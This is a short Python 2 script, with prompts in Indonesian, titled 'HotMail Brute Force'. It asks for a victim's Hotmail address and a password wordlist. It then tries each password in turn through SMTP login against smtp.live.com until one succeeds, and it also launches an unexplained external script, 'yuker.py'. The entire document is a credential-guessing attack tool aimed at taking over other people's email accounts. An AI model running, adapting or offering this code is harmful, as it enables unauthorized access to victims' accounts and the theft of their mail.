#!/usr/bin/python


import smtplib
import os

os.system("clear")

smtpserver = smtplib.SMTP("smtp.live.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

os.system("python yuker.py")

print "[!] HotMail Brute Force [!]"

user = raw_input("\nMasukkan HotMail Korban : ")
passwfile = raw_input("\nMasukkan Wordlist : ")
passwfile = open(passwfile, "r")

for password in passwfile:
		try:
				smtpserver.login(user, password)
		
				print "\n[!] Password Found : %s" % password
				break
		
		except smtplib.SMTPAuthenticationError:
				print "\n[!] Mencoba Password : %s" % password
